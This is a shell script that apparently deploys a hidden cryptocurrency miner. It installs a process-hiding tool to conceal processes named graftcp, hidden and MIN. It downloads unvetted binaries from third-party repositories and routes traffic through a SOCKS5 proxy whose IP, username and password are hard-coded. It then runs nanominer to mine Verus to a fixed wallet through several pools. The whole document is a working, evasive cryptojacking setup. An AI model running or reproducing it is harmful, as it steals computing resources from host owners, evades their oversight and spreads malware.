apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

apt update 
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider 

ph add graftcp
ph add hidden
ph add MIN

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 181.215.184.109:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://github.com/nanopool/nanominer/releases/download/v3.6.2/nanominer-linux-3.6.2.tar.gz && tar -xvf nanominer-linux-3.6.2.tar.gz && cd nanominer-linux-3.6.2 && chmod 7777 * &

apt -y install shadowsocks-libev rng-tools

./graftcp/graftcp ./nanominer -algo verushash -wallet RCpSUheBRfz96Q9KaNHz7FtQdwNyrb1b9d -coin verus -rigName ntah -pool1 na.luckpool.net:3956
sleep 2
./graftcp/graftcp ./nanominer -algo verushash -wallet RCpSUheBRfz96Q9KaNHz7FtQdwNyrb1b9d -coin verus -rigName ntah -pool1 eu.luckpool.net:3956
sleep 2
./graftcp/graftcp ./nanominer -algo verushash -wallet RCpSUheBRfz96Q9KaNHz7FtQdwNyrb1b9d -coin verus -rigName ntah -pool1 ap.luckpool.net:3956

